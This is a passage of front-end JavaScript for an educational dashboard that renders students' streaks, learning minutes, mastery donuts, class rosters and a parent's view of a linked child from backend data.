  var ico = document.getElementById('liveClassIco');
  var title = document.getElementById('liveClassTitle');
  var sub = document.getElementById('liveClassSub');
  if (ico) ico.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="12" r="7"/></svg>';
  if (title) title.textContent = 'LIVE NOW — Join';
  if (sub) sub.textContent = (s.subject ? s.subject + ' · ' : '') + (s.title || 'Class in progress') + ' — tap to join';
  card.setAttribute('href', 'live.html');
  card.style.borderColor = 'rgba(255,90,95,.5)';
  card.style.boxShadow = '0 0 0 1px rgba(255,90,95,.4), 0 10px 30px -8px rgba(255,90,95,.3)';
}

// Inject real backend numbers into the rendered views (best-effort, by role).
function applyDashboardData(user, data){
  // Greeting name everywhere
  document.querySelectorAll('[data-greet-name]').forEach(function(el){ el.textContent = user.name; });

  if (data.role === 'student'){
    // Real per-subject mastery + earned badges drive the donuts + badge shelf.
    applyMastery(data.mastery);
    if (data.stats){
      // NOT data.stats.streak — that is a stored legacy counter that
      // disagrees with the event-derived value (6 vs 2 in one payload).
      // insights.dayStreak is computed from real ProgressEvents, so it is
      // the one that matches what the streak chip and heatmap show.
      setText('#statStreak', (data.insights && data.insights.dayStreak != null)
        ? data.insights.dayStreak : data.stats.streak);
      setText('#statMinutes', data.stats.minutes);
    }
    setText('#statBadges', MASTERY.badges.length);
    // Real derived insights drive the streak number + weekly minutes chart + heatmap.
    if (data.insights) applyStudentInsights(data.insights);
  }
  if (data.role === 'teacher'){
    setText('#statStudents', data.studentCount);
    if (data.classAverage){
      setText('#statAvgMin', data.classAverage.avgMinutes);
      setText('#statAvgStreak', data.classAverage.avgDayStreak);
      setText('#statAvgWeekMin', data.classAverage.avgWeekMinutes);
    }
    setText('#statActiveWeek', data.activeThisWeek);
    applyTeacherInsights(data);

    // Real class header + roster table (replaces the hardcoded demo roster).
    var teaches = (data.profile && data.profile.teaches) || [];
    if (teaches[0]){
      var th = document.getElementById('tClassHead');
      if (th) th.innerHTML = 'Class <em>' + escapeHtml(teaches[0].className + '-' + teaches[0].section) +
        '</em> · ' + escapeHtml(teaches[0].subject) + ' · ' + data.studentCount + ' students';
    }
    if (Array.isArray(data.roster)){
      ROSTER = data.roster.map(function(s){
        return {
          n: s.name,
          t: (s.thisWeek && s.thisWeek.minutes) || 0,
          m: s.masteryPct || 0,
          w: s.weakSubject || '—'
        };
      });
      renderRoster();
      if (!ROSTER.length){
        $('#rosterBody').innerHTML =
          '<tr><td colspan="5"><p class="empty-hint" style="padding:14px 4px;">No students in your class yet — they appear here as soon as they sign up with your class & section.</p></td></tr>';
      }
    }
  }
  if (data.role === 'parent'){
    var kids = data.children || [];
    if (!kids.length){
      // Honest empty state instead of a demo child.
      setText('#childName', 'No child linked yet');
      var cc = document.getElementById('childClass');
      if (cc){ cc.removeAttribute('data-i18n'); cc.textContent = 'Link your child from signup (roll no + name + class)'; }
      setText('#childAvatarTxt', '?');
      setText('#pStreak', 0); setText('#pHours', '0h'); setText('#pAllTime', '0h');
      var la0 = document.getElementById('childLastActive');
      if (la0){ la0.removeAttribute('data-i18n'); la0.textContent = 'Last active · —'; }
      try { renderAttention(); } catch(e){}
      return;
    }
    var c = kids[0];
    // Show the REAL linked child — name, class, initials (was hardcoded demo data).
    setText('#childName', c.name);
    var ccls = document.getElementById('childClass');
    if (ccls){ ccls.removeAttribute('data-i18n'); ccls.textContent = c.classLabel || ''; }
    var ini = (c.name || '?').trim().split(/\s+/).map(function(p){ return p[0]; }).slice(0, 2).join('').toUpperCase();
    setText('#childAvatarTxt', ini || '?');
    setText('#pAllTime', ((c.minutes || 0) / 60).toFixed(1) + 'h');
    var la = document.getElementById('childLastActive');
    if (la){
      la.removeAttribute('data-i18n');
      la.textContent = 'Last active · ' + (c.lastActiveAt ? new Date(c.lastActiveAt).toLocaleString([], {day:'numeric', month:'short', hour:'2-digit', minute:'2-digit'}) : 'not yet');
    }
    // Prefer the real day-streak; fall back to the legacy counter.
    setText('#statChildStreak', c.dayStreak != null ? c.dayStreak : c.streak);
    setText('#statChildMinutes', c.minutes);
    setText('#pStreak', c.dayStreak != null ? c.dayStreak : (c.streak || 0));
    setText('#pHours', (((c.thisWeek && c.thisWeek.minutes) || 0) / 60).toFixed(1) + 'h');
    if (c.dayStreak != null) applyStudentInsights({
      dayStreak: c.dayStreak, weekly: c.weekly, thisWeek: c.thisWeek
    });
    try { renderAttention(); } catch(e){}
  }
}

// Pull real per-chapter progress and feed STATE.chapters, which drives the
// "Continue learning" card and the subject map.
//
// This is the second half of the fix. localStorage['edutok_state'] is written
// by nobody — api.js only DELETES it on login/logout — so STATE.chapters was
// permanently {} and the card rendered an empty grid. learn.html already calls
// EduAPI.getProgress() and hydrates from progress.chapters; the dashboard now
// does the same, so both surfaces agree.
async function hydrateChapterProgress(){
  if (!window.EduAPI || typeof EduAPI.getProgress !== 'function') return;
  var progress = null;
  try { progress = await EduAPI.getProgress(); }
  catch (e) { return; }              // offline / expired token — keep local view
  if (!progress || !progress.chapters) return;

  Object.keys(progress.chapters).forEach(function(id){
    var src = progress.chapters[id] || {};
    var cur = STATE.chapters[id] || {};
    // Backend shape is {completed, exercises, correct}; this view needs
    // {video, practice, mastered, test}. Map rather than assume they match —
    // they do not.
    STATE.chapters[id] = {
      video:    src.video    != null ? src.video    : (cur.video    || (src.completed ? 100 : 0)),
      practice: src.practice != null ? src.practice : (cur.practice || (src.exercises ? Math.min(100, src.exercises * 12) : 0)),
      test:     src.test     != null ? src.test     : (cur.test != null ? cur.test : null),
      mastered: src.mastered != null ? src.mastered : !!src.completed
    };
  });
  saveState();
  try { buildContinue(); animateContinue(); } catch(e){}
  try { buildSubjectMap(); } catch(e){}
  try { buildNextUp(); } catch(e){}
}

// Convert the backend mastery payload into the donut + badge data, then
// rebuild those widgets. Falls back to honest empty states when there's none.
function applyMastery(mastery){
  MASTERY = mastery && typeof mastery === 'object'
    ? { subjects: mastery.subjects || [], badges: mastery.badges || [], hasActivity: !!mastery.hasActivity }
    : { subjects: [], badges: [], hasActivity: false };

  SUBJECTS = MASTERY.subjects.map(function(s){
    return { name: s.name, pct: s.pct, color: (SUBJECT_COLORS[s.key] || '#7C9BFF') };
  });

  try { buildDonuts(); animateDonuts(); } catch(e){}
  try { buildBadges(); } catch(e){}
}

// Wire a student's (or child's) real insights into STATE + re-render charts.
function applyStudentInsights(ins){
  if (Array.isArray(ins.weekly) && ins.weekly.length === 7){
    STATE.minutes = ins.weekly.map(function(p){ return p.minutes || 0; });
    // Feed the calendar heatmap with the real per-day minutes we have.
    ins.weekly.forEach(function(p){ if (p && p.day) HEAT_BY_DAY[p.day] = p.minutes || 0; });
  }
  // NOTE: chapter progress is hydrated separately in hydrateChapterProgress(),
  // from EduAPI.getProgress() — see the comment there.
  // The full 8-week daily series. Before the backend exposed `daily`, the
  // heatmap could only ever be seeded from `weekly` — 7 real values out of 56
  // cells — so 49 days rendered as "no learning" no matter what the student
  // had actually done. Applied after `weekly` so both agree on overlap.
  if (Array.isArray(ins.daily)){
    ins.daily.forEach(function(p){ if (p && p.day) HEAT_BY_DAY[p.day] = p.minutes || 0; });
  }
  if (Array.isArray(ins.weekly) || Array.isArray(ins.daily)){
    try { buildHeatmap(); } catch(e){}
  }
  if (typeof ins.dayStreak === 'number') STATE.streak = ins.dayStreak;
  if (typeof ins.activeToday === 'boolean') STATE.activeToday = ins.activeToday;

  // Re-render the strip (streak + weekly total) and the bar chart with real data.
  try { initStrip(); } catch(e){}
  try { buildBars(); animateBars(); } catch(e){}
  // The "Your week" tiles read STATE.minutes/streak, which just changed.
  try { buildWeekGrid(); } catch(e){}
  // The parent's "Learning time this week" area chart was built once in init()
  // from the all-zero DEFAULTS and never rebuilt here, so it stayed flat even
  // when the child had real minutes — the card reported 5.8h this week above a
  // chart showing nothing. animateArea() (the only other caller, via
  // VIEW_ANIMATORS.parent) just animates whatever geometry already exists, so
  // the rebuild has to happen here alongside the bar chart.
  try { buildArea(); animateArea(); } catch(e){}

  // This-week summary numbers, if those elements exist.
  if (ins.thisWeek){
    setText('#weekMinutes', ins.thisWeek.minutes);
    setText('#weekLessons', ins.thisWeek.lessons);
    setText('#weekActiveDays', ins.thisWeek.activeDays);
  }
}

// Teacher: render top + needs-attention lists if their containers exist.
function applyTeacherInsights(data){
  var topHost = document.querySelector('#topStudents');
  if (topHost && Array.isArray(data.topStudents)){
    topHost.innerHTML = data.topStudents.map(function(s){
      return '<div class="myrow"><span>' + escapeHtml(s.name) + '</span>' +
             '<span class="when">' + (s.thisWeek ? s.thisWeek.minutes : 0) + ' min</span></div>';
    }).join('') || '<p class="empty-hint">No activity yet this week.</p>';
  }
  var attnHost = document.querySelector('#needsAttention');
  if (attnHost && Array.isArray(data.needsAttention)){
    attnHost.innerHTML = data.needsAttention.length
      ? data.needsAttention.map(function(s){
          return '<div class="myrow"><span>' + escapeHtml(s.name) + '</span>' +
                 '<span class="when" style="color:var(--rose)">0 min</span></div>';
        }).join('')
      : '<p class="empty-hint">Everyone was active this week 🎉</p>';
  }

  // Real class-average mastery + weak-topic breakdown, derived from the
  // roster's own masteryPct/weakSubject fields (replaces the old hardcoded
  // 76% ring and fixed Photosynthesis/Heat/etc. bars).
  var roster = Array.isArray(data.roster) ? data.roster : [];
  TEACHER_AVG_MASTERY = roster.length
    ? Math.round(roster.reduce(function(sum, s){ return sum + (s.masteryPct || 0); }, 0) / roster.length)
    : 0;

  var weakCounts = {};
  roster.forEach(function(s){
    if (!s.weakSubject || s.weakSubject === '—') return;
    weakCounts[s.weakSubject] = (weakCounts[s.weakSubject] || 0) + 1;
  });
  var totalFlagged = Object.keys(weakCounts).reduce(function(sum, k){ return sum + weakCounts[k]; }, 0);
  WEAK_TOPICS = Object.keys(weakCounts)
    .map(function(name){
      // % of the roster that's weak in this topic — an honest, real signal,
      // not a mastery score (which the roster doesn't break down per-topic).
      return { name: name, pct: totalFlagged ? Math.round((weakCounts[name] / totalFlagged) * 100) : 0 };
    })
    .sort(function(a, b){ return b.pct - a.pct; })
    .slice(0, 5);

  try { animateTeacherRing(); } catch(e){}
  try { buildHbars(); animateHbars(); } catch(e){}
}

function escapeHtml(s){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function setText(sel, v){ var el = document.querySelector(sel); if (el && v != null) el.textContent = v; }

function init(){
  initDates();
  initStrip();
  buildBars();
  buildDonuts();
  buildBadges();
  buildNextUp();
  buildWeekGrid();
  buildSubjectMap();
  buildContinue();
  buildHbars();
  renderRoster();
  buildArea();
  buildHeatmap();
  initEvents();
  initReveals();
  applyLang(STATE.lang === 'hi' ? 'hi' : 'en');
  // Auth + role lock replaces the old hardcoded setRole('student').
  bootAuth();
}

if (document.readyState === 'loading'){
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

})();



/* ---- inline on* handlers, re-attached; see extract-page-js.mjs ---- */
;(function () {
  function __bindEvt(sel, type, fn) {
    document.querySelectorAll(sel).forEach(function (el) {
      el.addEventListener(type, fn);
      onCleanup(function () { el.removeEventListener(type, fn); });
    });
  }
  __bindEvt("#view-student > div:nth-of-type(1) > div:nth-of-type(13) > div:nth-of-type(1) > a:nth-of-type(1)", "mouseover", function (event) { this.style.color='var(--cream)' });
  __bindEvt("#view-student > div:nth-of-type(1) > div:nth-of-type(13) > div:nth-of-type(1) > a:nth-of-type(1)", "mouseout", function (event) { this.style.color='var(--muted)' });
})();
}
